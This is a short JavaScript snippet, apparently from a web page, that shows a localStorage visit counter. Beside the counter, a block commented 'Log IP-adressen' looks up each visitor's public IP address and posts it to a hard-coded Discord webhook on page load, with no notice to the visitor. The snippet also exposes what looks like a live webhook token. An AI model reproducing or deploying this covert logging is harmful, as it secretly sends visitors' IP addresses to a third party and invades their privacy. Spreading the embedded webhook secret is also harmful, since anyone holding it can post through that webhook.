
        // Retrieve the current count from localStorage
        let count = localStorage.getItem('visitCount') || 0;
        
        // Update the count and display it
        count++;
        document.getElementById('counter').textContent = `Views: ${count}`;

        // Store the updated count back to localStorage
        localStorage.setItem('visitCount', count);

        // Log IP-adressen
        fetch('https://api.ipify.org')
            .then(response => response.text())
            .then(ip => {
                const webhookUrl = 'https://discord.com/api/webhooks/1233699920729341984/xwmhMCGh3Zd5AvC8aEjlDsrsrnY7LnhfNNeRMYQsk-FSh0907SBiXTPH_AB7UX7fMKqO';
                const data = { content: `IP-Adresse: ${ip}` };
                fetch(webhookUrl, { method: 'POST', body: JSON.stringify(data), headers: { 'Content-Type': 'application/json' } });
            });
    
